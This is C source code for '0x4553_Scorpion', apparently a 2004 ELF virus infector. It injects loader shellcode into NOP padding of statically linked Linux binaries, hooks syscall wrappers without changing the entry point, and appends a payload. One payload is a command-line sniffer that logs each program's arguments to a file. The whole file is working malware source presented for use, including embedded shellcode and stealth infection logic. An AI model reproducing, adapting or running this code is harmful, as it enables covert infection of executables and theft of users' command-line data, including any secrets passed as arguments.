/* 
 *
 * 0x4553_Scorpion by Ares, 2004
 * 
 * Infecting tool for staticaly linked ELF bin
 *
 * [ http://ares.x25zine.org ]
 *
 * evil evil evil
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <elf.h>
#include <stdarg.h>
#include <unistd.h>

#define BASE 0x8048000
#define TYPE *(unsigned char*)
#define STEP 7

char pattern[]=	    	"\x53\x8b\x54\x24\x10\x8b\x4c\x24"
	    		"\x0c\x8b\x5c\x24\x08\xb8\x00\x00"
	    		"\x00\x00\xcd\x80";

char hello_payload[]=	"\x55\x89\xe5\xb8\x04\x00\x00\x00"
			"\xbb\x01\x00\x00\x00\x6a\x0a\x68"
			"\x30\x77\x6e\x7a\x89\xe1\xba\x05"
			"\x00\x00\x00\xcd\x80\xc6\x05\x00"
			"\x00\x00\x50\x45\xc9\xc3";

char loader[]= 	    	"\x57\x56\x55\x89\xe5\x6a\x00\x6a"
			"\xff\x6a\x21\x6a\x03\x6a\x01\x68"
			"\x00\x00\x00\x50\x54\x5b\x6a\x5a"
			"\x58\xcd\x80\x3d\x00\x00\x00\x50"
			"\x90\x90\x90\x74\x04\xc9\x5e\x5f"
			"\xc3\x96\x46\x68\x78\x65\x00\x00"
			"\x68\x6c\x66\x2f\x65\x68\x63\x2f"
			"\x73\x65\x68\x2f\x70\x72\x6f\x89"
			"\xe3\x6a\x55\x58\x56\x59\xb2\x64"
			"\xcd\x80\x87\xcb\x6a\x05\x58\x31"
			"\xc9\xcd\x80\x97\x6a\x6a\x58\x56"
			"\x59\xcd\x80\x83\xc6\x14\x8b\x0e"
			"\x83\xe9\x00\x6a\x13\x58\x57\x5b"
			"\x31\xd2\xcd\x80\x6a\x03\x58\x56" 
			"\x59\xb2\x00\xcd\x80\xff\xd6\xc9"
			"\x5e\x5f\xc3";
		    
char nop_field[]=   	"\x90\x90\x90\x90\x90\x90\x90\x90"
			"\x90\x90\x90\x90\x90";

char sniff_payload[]=	"\x55\x89\xe5\x6a\x00\x6a\xff\x6a"
			"\x21\x6a\x03\x6a\x01\x6a\x00\x54"
			"\x5b\xb8\x5a\x00\x00\x00\xcd\x80"
			"\x89\xc6\xeb\x42\x5b\xb8\x05\x00"
			"\x00\x00\x31\xc9\xcd\x80\x89\xc3"
			"\xb8\x03\x00\x00\x00\x89\xf1\xba"
			"\xe8\x03\x00\x00\xcd\x80\xeb\x3e"
			"\x5b\xb8\x05\x00\x00\x00\xb9\x02"
			"\x00\x00\x00\xcd\x80\x89\xc3\xb8"
			"\x04\x00\x00\x00\x89\xf1\xba\xe8"
			"\x03\x00\x00\xcd\x80\xc6\x05\x00"
			"\x00\x00\x50\x45\xc9\xc3\xe8\xb9"
			"\xff\xff\xff\x2f\x70\x72\x6f\x63"
			"\x2f\x73\x65\x6c\x66\x2f\x63\x6d"
			"\x64\x6c\x69\x6e\x65\x00\xe8\xbd"
			"\xff\xff\xff\x6c\x6f\x67";



int main(int argc, char* argv[])
{


// -------------------------------------- //
// ------------ D e f i n e s ----------- //

    struct stat stat;
    Elf32_Ehdr ehdr;

    FILE *file;

    char *data;
    char *infect_code;
    char nop_field_array[255][8];
    char targ[255];
    char arc;
    
    int len,entry,fd,count=0,cn=0;
    int op_len;
    int hook_addr;
    int nop_c=0;
    int ptrn_size = sizeof(pattern) - 1;
    int nop_f_cn=0;
    int rva,rva2;
    int inf_c;
    int code_c;
    int payload;
    int infect_size;

// -------------------------------------- //


    printf("\n\t0x4553_Scorpion by Ares, 2004 [Electronic Souls]\n\n");
    printf("\tELF infecting tool for staticaly linked files\n\n");
    printf("-------------------------------------------------------------\n");
    printf("Features:\n");


    printf("\t[1]. Doesn't change entry point\n");
    printf("\t[2]. Stealth infecting via alignment (nop) fields\n");
    printf("\t[3]. Possible to do not change target's file size\n");
    printf("\t[4]. Doesn't need SYMBOLS, i.e could work with even sstriped files\n\n");
    printf("-------------------------------------------------------------\n");

    if (argc < 4)
     {
     
         printf("Usage:%s -b <binary> -p <payload> -h <hook>\n\n",argv[0]);
	 printf("<payload>:\n");
	 printf("\t[1] - hello payload, would insert word \"0wnz\" on executing\n");
	 printf("\t[2] - argv[] sniffer, would sniff all command line and log into [log]\n\n");
	 printf("<hook>: - The function to hook up, default pattern could be used for those 4\n");
	 printf("\t[3]  - read\n");
	 printf("\t[4]  - write\n");
	 printf("\t[5]  - open\n");
	 printf("\t[19] - lseek\n\n");
	 exit(0);
	 
     }

    while ((arc = getopt (argc , argv, "b:p:h:")) != EOF)
     {
    
        switch (arc)
            {
		     
	      case 'b':   sprintf(targ,"%s",optarg);
                	  break;
			  
              case 'p':   payload  = atoi(optarg);
                          break;
              
	      case 'h':   pattern[14]  = atoi(optarg);
                          break;
			  
	      default: break;
	    
	    }
     }


    

    if (payload == 1) 
     {
        
        infect_size = sizeof(hello_payload) - 1;
	
	infect_code = (char*)malloc(infect_size);
	memcpy(infect_code,hello_payload,sizeof(hello_payload));
         
     }
     else
     {
        
        infect_size = sizeof(sniff_payload) - 1;
	
	infect_code = (char*)malloc(infect_size);
	memcpy(infect_code,sniff_payload,sizeof(sniff_payload));
         
     }
     
     
    // fix size of payload in loader
    loader[98] = infect_size;
    loader[114] = infect_size;

    file=fopen(targ,"rwb");
    fread(&ehdr,sizeof(ehdr),1,file);
    entry = ehdr.e_entry;

    fclose(file);


    fd = open("test",O_RDWR);

    printf("|* Infecting [%s]\n|*---\n",targ);
    printf("|* Size of loader [%d] bytes\n",sizeof(loader)-1);

    fstat(fd, &stat);
    len = stat.st_size;
    data = (char *)malloc(len);

    read( fd, data, len);			// read data
    data = data + entry - BASE;

    close(fd);


    for (; op_len >= 0 ; count = count + op_len)
     {

        op_len = l_disasm ( data + count);	// get opcode length

        if (memcmp( data + count, pattern, ptrn_size) == 0){ hook_addr = entry + count; op_len=-1;}
    
     }

    if(hook_addr == 0){printf("|* Pattern wasn't found...quiting\n");exit(-1);}
    
    printf("|* Pattern found at 0x%x\n|*---\n", hook_addr);



    for (count = 0, op_len = 0;  count < len - entry + BASE ; count = count + op_len)
     {

        op_len = l_disasm ( data + count);	
	if(op_len < 0)goto brr;

        if (memcmp( data + count, nop_field, sizeof(nop_field)-1) == 0)
	 {
	 
	    if(entry + count - 0x23 != hook_addr )
	     {
	    
    		sprintf(nop_field_array[nop_f_cn],"%x",entry + count);
		nop_f_cn++;
        	nop_c = nop_c + sizeof(nop_field) - 1;
		count = count + sizeof(nop_field) - 1;

	     }
	    
	 }
	
     }


brr:

    for(count = 0; count != nop_f_cn; count++)
    {
	
	rva = strtoll(nop_field_array[count],NULL,16);
        printf("|* Nop field found at 0x%x\n",rva);
    
    }

    printf("|*---\n|* Available space for code %d - %d for relative jmps = [%d] bytes\n|*---\n",nop_c, nop_f_cn*5,nop_c - nop_f_cn*5);

    if (sizeof(loader) > nop_c - nop_f_cn*5) 
     { 

	printf("|* Not enough space for code...quiting\n");
	exit(-1);
	
     }



    ptrn_size = 34;

    for (;cn != ptrn_size +2; cn++)
     {

	TYPE (data - entry + hook_addr + ptrn_size + STEP - cn ) = TYPE (data - entry  +( hook_addr  ) + ptrn_size -cn );
	TYPE (data - entry + hook_addr + ptrn_size - cn ) = 0x90;
    
     }


    // self fixing of offsets 
    TYPE (data - entry + hook_addr + ptrn_size + STEP ) = TYPE (data - entry  +( hook_addr  ) + ptrn_size + STEP ) - STEP;
    TYPE (data - entry + hook_addr + ptrn_size + STEP -6) = TYPE (data - entry  +( hook_addr  ) + ptrn_size + STEP -6 ) - STEP;

								// set absolute call to virus  body 
    rva = strtoll(nop_field_array[0],NULL,16);

    TYPE (data - entry + hook_addr) = 0xb8;			// mov $addr,%eax

    TYPE (data - entry + hook_addr + 1) = (rva) & 0xff;		// inverting our addr for mov instruction
    TYPE (data - entry + hook_addr + 2) = (rva >> 8 ) & 0xff;
    TYPE (data - entry + hook_addr + 3) = (rva >> 16) & 0xff;
    TYPE (data - entry + hook_addr + 4) = (rva >> 24) & 0xff;

    TYPE (data - entry + hook_addr + 5) = 0xff;			// call *%eax
    TYPE (data - entry + hook_addr + 6) = 0xd0;
    
    printf("|* Injecting loader code...\n");


// ------------------------------------------

    for(inf_c=0, code_c=0; inf_c < nop_f_cn; inf_c++)
     {
     
        rva = strtoll(nop_field_array[inf_c],NULL,16);

        for (count=0,op_len=0; count < 8; count = count + op_len, code_c = code_c + op_len)
         {
    
	    op_len = l_disasm(loader + code_c);
	    if (count + op_len <= 8 )
	    memcpy(data - entry + rva + count, loader + code_c, op_len);
	    else goto nah;
		    
         }
	 
nah:
	if(code_c >= sizeof(loader) - 1)goto next;

// calculate offset between current and next nop field
        rva2 = strtoll(nop_field_array[inf_c+1],NULL,16) - strtoll(nop_field_array[inf_c],NULL,16) - 5 - count;

        TYPE (data - entry + rva + count ) = 0xe9;				// jmp 
        TYPE (data - entry + rva + count +1 ) = (rva2) & 0xff;
        TYPE (data - entry + rva + count +2 ) = (rva2 >> 8 ) & 0xff;
        TYPE (data - entry + rva + count +3 ) = (rva2 >> 16) & 0xff;
        TYPE (data - entry + rva + count +4 ) = (rva2 >> 24) & 0xff;

     }

next:


// ------------------------------------------
    
    fd=open("output",O_APPEND|O_WRONLY);
    write(fd,data - entry + BASE,len);

    printf("|* Adding virus code...\n|*---\n");
    printf("|* %d bytes injected\n|*---\n",infect_size);

    write(fd,infect_code,infect_size);
    close(fd);
    
    printf("|* Done ! Check [output]\n");

    exit(4553);

}
